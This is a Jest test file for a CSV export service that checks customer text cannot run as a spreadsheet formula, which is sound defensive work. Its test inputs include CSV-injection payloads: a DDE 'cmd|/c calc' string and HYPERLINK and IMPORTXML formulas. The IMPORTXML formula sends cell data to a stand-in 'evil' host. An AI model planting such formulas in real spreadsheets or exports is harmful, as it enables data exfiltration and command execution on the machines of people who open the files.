import type { Response } from 'express';
import { ExportService, csvField } from './export.service';

/**
 * CSV exports (#39): customer-controlled text (names, emails, product titles)
 * must never be interpreted as a spreadsheet formula when an admin opens the
 * file in Excel / Sheets. Cells starting with = + - @ TAB or CR get a leading
 * apostrophe (OWASP "CSV injection"); real numbers are left alone.
 */
describe('csvField', () => {
  it.each([
    ['=HYPERLINK("http://evil","x")', `"'=HYPERLINK(""http://evil"",""x"")"`],
    ['+1+cmd|"/c calc"!A0', `"'+1+cmd|""/c calc""!A0"`],
    ['-2+3', "'-2+3"],
    ['@SUM(A1:A9)', "'@SUM(A1:A9)"],
    ['\t=1+1', "'\t=1+1"],
    ['\r=1+1', `"'\r=1+1"`],
  ])('neutralises %j', (input, expected) => {
    expect(csvField(input)).toBe(expected);
  });

  it.each([
    ['Ada', 'Ada'],
    ['a@b.com', 'a@b.com'],
    ['19.99', '19.99'],
    ['-5.00', '-5.00'],
    ['Smith, Jr.', '"Smith, Jr."'],
  ])('leaves %j as a normal cell', (input, expected) => {
    expect(csvField(input)).toBe(expected);
  });

  it('keeps numbers and empty values unchanged', () => {
    expect(csvField(-3)).toBe('-3');
    expect(csvField(0)).toBe('0');
    expect(csvField(null)).toBe('');
    expect(csvField(undefined)).toBe('');
  });
});

describe('ExportService.streamCustomers', () => {
  it('writes a formula-looking first name as inert text', async () => {
    const prisma = {
      user: {
        findMany: jest.fn().mockResolvedValueOnce([
          {
            id: 7,
            firstName: '=IMPORTXML("http://evil/?"&B2,"//a")',
            lastName: 'Doe',
            email: 'jane@example.com',
            status: 'ACTIVE',
            createdAt: new Date('2026-01-01T00:00:00Z'),
            _count: { orders: 0 },
          },
        ]),
      },
      order: { groupBy: jest.fn().mockResolvedValue([]) },
    };
    const chunks: string[] = [];
    const res = {
      setHeader: jest.fn(),
      write: jest.fn((c: string) => chunks.push(c)),
      end: jest.fn(),
    } as unknown as Response;

    await new ExportService(prisma as never).streamCustomers(res);

    const row = chunks[1];
    expect(row.startsWith(`7,"'=IMPORTXML(`)).toBe(true);
    expect(row).not.toMatch(/(^|,)"?=/);
  });
});
